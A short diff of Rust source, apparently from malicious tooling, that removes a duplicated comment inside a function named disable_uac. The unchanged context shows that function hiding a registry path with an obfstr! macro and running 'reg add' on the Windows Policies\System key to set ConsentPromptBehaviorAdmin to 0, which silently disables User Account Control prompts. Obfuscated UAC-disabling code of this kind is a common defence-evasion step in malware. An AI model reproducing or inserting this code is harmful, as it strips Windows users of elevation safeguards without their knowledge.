@@ -58,7 +58,6 @@ pub fn disable_uac() -> Result<(), Box<dyn std::error::Error>> {
     use std::process::Command;
     
     // ConsentPromptBehaviorAdmin = 0
-    // ConsentPromptBehaviorAdmin = 0
     let _ = Command::new("reg")
         .args(&[
             "add", obfstr!("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"),
